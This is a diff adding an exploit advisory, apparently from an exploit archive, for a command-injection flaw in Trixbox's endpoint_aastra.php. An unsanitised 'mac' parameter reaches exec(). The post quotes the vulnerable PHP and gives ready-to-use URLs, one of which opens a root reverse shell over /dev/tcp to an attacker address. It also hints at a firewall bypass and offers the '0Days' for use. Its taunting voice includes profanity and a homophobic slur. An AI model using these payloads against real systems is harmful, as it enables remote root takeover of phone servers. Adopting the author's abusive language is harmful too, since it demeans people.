@@ -1,0 +1,89 @@
+# App : Trixbox all versions
+# vendor : trixbox.com
+# Author : i-Hmx
+# mail : n0p1337@gmail.com
+# Home : security arrays inc , sec4ever.com ,exploit4arab.net
+
+Well well well , we decided to give schmoozecom a break and have a look @
+fonality products
+do you think they have better product than the (Award winning) trixbox!!!
+I don't think so
+"Designed and marketed for Fonality's partner community, trixbox Pro is an
+IP-PBX software solution purpose built to support growing SMB businesses.
+A unique hybrid hosted telephony solution; trixbox Pro provides big
+business features at an SMB cost . . blah blah blah"
+What do we have here??
+A 3 years old Sql injection flaw???
+not big deal , and already been reported
+not enough good exploitation , but reported
+A file disclosure flaw???
+save it for later
+let's give Fonality little Remote root Exploit xD
+and also give the "Predictors" some pain in the ass trying to exploit this
+consider it as challenge ;)
+Here we go
+Vulnerable file :
+/var/www/html/maint/modules/endpointcfg/endpoint_aastra.php
+Pice of shit , sorry i mean code
+
+switch($_action) {
+    case 'Edit':
+        if ($_REQUEST['newmac']){ // create a new phone from device map
+            $mac_address = $_REQUEST['newmac'];
+        }
+        if ($_REQUEST['mac']){
+            $phoneinfo = GetPhone($_REQUEST['mac'],$PhoneType);
+            $mac_address=$phoneinfo['mac_address'];    } // if there is a
+request ID we Edit otherwise add a new phone
+
+        $freepbx_device_list = GetFreepbxDeviceList();
+        $smarty->assign("mac_address", $mac_address);
+        $smarty->assign("phone", $phoneinfo);
+        $smarty->assign("freepbx_device_list", $freepbx_device_list);
+
+        $smarty->assign("message", $message);
+        $template = "endpoint_".$PhoneType."_edit.tpl";
+        break;
+
+    case 'Delete':
+        exec("rm ".$sipdir.$_REQUEST['mac'].".cfg");
+        getSQL("DELETE FROM ".$PhoneType." WHERE
+mac_address='".$_REQUEST['mac']."'",'endpoints');
+        $smarty->assign("phones", ListPhones($PhoneType));
+        $template = "endpoint_".$PhoneType."_list.tpl";
+        break;
+
+it's obvious we care about this line
+>>>exec("rm ".$sipdir.$_REQUEST['mac'].".cfg");<<<
+Exploitation demo :
+maint/modules/endpointcfg/endpoint_aastra.php?action=Delete&mac=fa;echo
+id>xx;faris
+result will be written to xx
+but this is not the full movie yet ,
+Am here to give fonality an night mare , which take the form of "root"
+privzz
+actually the server is configured by default to allow the web interface
+pages to edit many files @ the root directory
+so any noob can easily execute the "sudo fuck" with out being permited for
+password , and the result is > root
+Demo
+<Back connection with root privs>
+maint/modules/endpointcfg/endpoint_aastra.php?action=Delete&mac=fa;sudo
+bash -i >%26 %2fdev%2ftcp%2fxxx.xxx.xxx.xxx%2f1337 0>%261;faris
+change to your ip and the port you are listening to
+and , Volia , you are root
+now am sure you're happy as pig in shit xD
+Still need more??
+you will notice that you're unable to reach this file due to the http
+firewall
+but actually there is simple and yet dirty trick that allow you to get pass
+through it , and execute your command smooooothely as boat on the river ;)
+And here come the challenge , let's see what the faggots can do with this ;)
+need hint???
+use your mind and fuck off :/
+
+Big greets fly to the all sec4ever family
+oh , and for voip lames , you can use our 0Days for sure
+but once it become 720Days xD
+Regards,
+Faris <the Awsome>
